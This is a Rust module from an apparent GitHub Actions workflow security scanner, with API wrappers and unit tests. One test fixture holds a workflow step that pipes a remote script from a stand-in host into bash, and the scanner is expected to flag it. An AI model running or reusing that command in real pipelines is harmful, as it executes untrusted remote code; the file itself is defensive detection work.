use std::path::Path;

use crate::{
    error::DustResult,
    models::{Workflow, WorkflowScanReport},
    workflow,
};

/// Parses local GitHub Actions workflow files for consumers such as secret
/// exposure analysis. No workflow, action, shell command, or network request
/// is executed.
pub fn parse_workflows(root: &Path) -> DustResult<Vec<Workflow>> {
    workflow::parse(root)
}

/// Runs the local, read-only GitHub Actions workflow security analyzer.
pub fn workflow_security_scan(root: &Path) -> DustResult<WorkflowScanReport> {
    workflow::scan(root)
}

/// Alias for callers that prefer the shorter scan-oriented API name.
pub fn workflow_scan(root: &Path) -> DustResult<WorkflowScanReport> {
    workflow_security_scan(root)
}

#[cfg(test)]
mod tests {
    use tempfile::TempDir;

    use super::*;

    #[test]
    fn parses_workflows_through_the_public_core_api() {
        let temp_dir = TempDir::new().unwrap();
        let directory = temp_dir.path().join(".github/workflows");
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("test.yml"),
            "name: Test\njobs:\n  test:\n    steps:\n      - run: cargo test\n",
        )
        .unwrap();

        let workflows = parse_workflows(temp_dir.path()).unwrap();

        assert_eq!(workflows.len(), 1);
        assert_eq!(
            workflows[0].jobs["test"].steps[0].run.as_deref(),
            Some("cargo test")
        );
    }

    #[test]
    fn workflow_scan_reports_findings_without_executing_run_steps() {
        let temp_dir = TempDir::new().unwrap();
        let directory = temp_dir.path().join(".github/workflows");
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("test.yml"),
            "name: Test\npermissions: read-all\njobs:\n  test:\n    steps:\n      - run: curl https://example.test/payload | bash\n",
        )
        .unwrap();

        let report = workflow_security_scan(temp_dir.path()).unwrap();

        assert_eq!(report.workflows.len(), 1);
        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].rule_id, "remote-script-pipe");
    }
}
